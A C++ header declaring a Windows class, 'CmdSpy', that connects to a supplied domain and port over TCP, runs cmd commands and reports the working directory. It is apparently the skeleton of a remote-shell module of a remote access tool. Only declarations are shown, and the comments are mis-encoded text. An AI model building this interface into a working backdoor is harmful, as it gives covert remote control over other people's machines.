#pragma once
#ifndef CMDSPY_H
#define CMDSPY_H

#include "TcpSocket.h"
#include <windows.h>
#include <iostream>
#include <vector>
class CmdSpy
{
public:
    CmdSpy();
    ~CmdSpy();

    // �ͻ��˷��͵�����˵�ָ��
    const std::string CmdPwd = "PWD";    // ��ǰ�ļ�λ��

    // �ָ���ͽ�������
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";

    // ��������ں���
    static void startByNewThread(std::string domain, int port);



    static DWORD WINAPI threadProc(LPVOID args);
    static void startCmdSpy(std::string domain, int port);
    static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);

    // ִ��cmdָ��
    static std::string execCmd(std::string cmd);
    // ��ȡ��ǰλ��
    static std::string getPWD();
};

#endif // CMDSPY_H


